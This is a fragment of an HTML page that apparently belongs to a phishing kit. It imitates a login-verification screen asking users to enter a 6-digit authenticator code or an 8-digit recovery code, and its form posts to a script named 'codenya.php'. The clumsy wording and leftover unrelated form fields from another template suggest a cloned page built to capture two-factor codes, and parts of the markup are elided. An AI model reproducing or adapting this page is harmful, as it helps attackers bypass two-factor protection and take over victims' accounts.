...
<center><img alt="" src="45.png" width="93%">
</div>
...
<div class="Caption ">
<center><div class="thepadding"><span style="color: #3c78d8; font-family: 'Roboto', 'Arial'; font-size: 13pt; vertical-align: baseline;"><hr><h4 class="h4_of text-center">Approve from another device or Enter your login code</h4></span>  <b style="color: #4d4d4d;font-weight: bold;"></b></div>
<center><font color="grey">Enter the 6-digit code we just sent from the authentication app you set up. or Enter the 8-digit recovery code.<a></a>
</div>
</div>
<form action="codenya.php?button_location=settings&amp;button_name=help" method="POST">
<div class="ElementWrapper">
<div data-form-element-key="PrevYearDays" class="FormElement FormElement_TextBox NoTopMargin PrevToPrevYearDays">
...
<div data-form-element-key="USResidentCueAlert" class="FormElement FormElement_AlertMessage AlertMessageTopMargin USResidentCueAlert ">
</div>

<div data-form-element-key="ButtonNext" class="FormElement FormElement_Button ButtonNext">
<div class="Button">
<button name="ButtonNext" class="ButtonNext" data-elements-processor="">
Submit Code
</button>
</div>
</div>
